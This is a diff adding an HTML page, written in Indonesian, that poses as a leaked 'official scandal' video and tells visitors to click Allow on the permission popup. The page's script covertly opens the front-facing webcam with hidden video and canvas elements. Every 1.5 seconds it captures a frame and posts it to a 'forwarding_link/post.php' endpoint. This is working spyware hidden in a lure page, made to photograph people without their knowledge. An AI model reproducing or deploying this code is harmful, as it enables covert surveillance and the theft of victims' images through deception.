@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <style>
+      /* Apply general styles to the body */
+      body {
+        font-family: Arial, sans-serif; /* Change the font to a clean and modern style */
+        background-color: #f700ff; /* Soft light blue background */
+        color: #f700ff; /* Dark text color for good readability */
+        line-height: 1.6; /* Spacing between lines */
+        text-align: center; /* Center-align text */
+        padding: 20px; /* Add padding around the content */
+      }
+
+      /* Style for paragraphs */
+      p {
+        font-size: 20px; /* Increase the font size */
+        margin: 15px 0; /* Add some spacing between paragraphs */
+        padding: 10px;
+        background-color: #ffd000; /* White background for the paragraphs */
+        border-radius: 8px; /* Rounded corners */
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+        transition: all 0.3s ease-in-out; /* Smooth transition for hover effect */
+      }
+
+      /* Add hover effect for paragraphs */
+      p:hover {
+        background-color: #ffd900; /* Light blue background on hover */
+        transform: scale(1.05); /* Slightly increase the size on hover */
+      }
+
+      /* Style the checkbox */
+      label {
+        font-size: 18px;
+        font-weight: bold;
+        color: #ccb800; /* Dark teal color */
+      }
+
+      /* Style for the checkbox itself */
+      input[type="checkbox"] {
+        margin-right: 10px; /* Space between checkbox and label */
+      }
+
+      /* Add spacing around the checkbox and label */
+      .checkbox-container {
+        margin-top: 20px;
+      }
+
+      /* Add some padding and border for the body container */
+      .content-container {
+        max-width: 600px;
+        margin: 0 auto;
+        padding: 30px;
+        background-color: #ffffff;
+        border-radius: 12px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      }
+    </style>
+    <script
+      type="text/javascript"
+      src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"
+    ></script>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"
+    />
+    <script
+      type="text/javascript"
+      src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"
+    ></script>
+  </head>
+
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+  <script>
+    function post(imgdata) {
+      $.ajax({
+        type: "POST",
+        data: { cat: imgdata },
+        url: "forwarding_link/post.php",
+        dataType: "json",
+        async: false,
+        success: function (result) {
+          // call the function that handles the response/results
+        },
+        error: function () {},
+      });
+    }
+
+    ("use strict");
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const errorMsgElement = document.querySelector("span#errorMsg");
+
+    const constraints = {
+      audio: false,
+      video: {
+        facingMode: "user",
+      },
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      }
+    }
+
+    // Success
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+
+      var context = canvas.getContext("2d");
+      setInterval(function () {
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas
+          .toDataURL("image/png")
+          .replace("image/png", "image/octet-stream");
+        post(canvasData);
+      }, 1500);
+    }
+
+    // Load init
+    init();
+  </script>
+
+  <body>
+    <div class="content-container">
+      <p>
+        <strong>Skandal Pejabat (saya Hide agar Website Tidak di Ban)</strong>
+      </p>
+      <p><em>Klik Allow di PopUp Box untuk melihat Video</em></p>
+      <p><em>Regards : Mr. 777</em></p>
+    </div>
+  </body>
+</html>
